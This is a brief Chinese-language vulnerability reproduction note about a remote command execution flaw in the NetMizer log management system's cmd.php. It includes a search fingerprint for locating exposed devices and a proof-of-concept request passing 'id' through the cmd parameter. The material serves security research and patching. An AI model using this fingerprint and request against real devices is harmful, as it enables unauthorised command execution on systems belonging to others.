---
title: "NetMizer 日志管理系统 cmd.php 远程命令执行漏洞"
date: 2026-10-18 09:15:06
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "NetMizer"
tags:
  - "NetMizer"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

NetMizer 日志管理系统 cmd.php中存在远程命令执行漏洞，攻击者通过传入 cmd参数即可命令执行

## 漏洞影响

```
NetMizer 日志管理系统
```

## 网络测绘

```
title="NetMizer 日志管理系统"
```

## 漏洞复现

登录页面

![image-20220519175506872](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191755197.png)

验证POC

```
/data/manage/cmd.php?cmd=id
```

![image-20220519175604237](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191756275.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/NetMizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
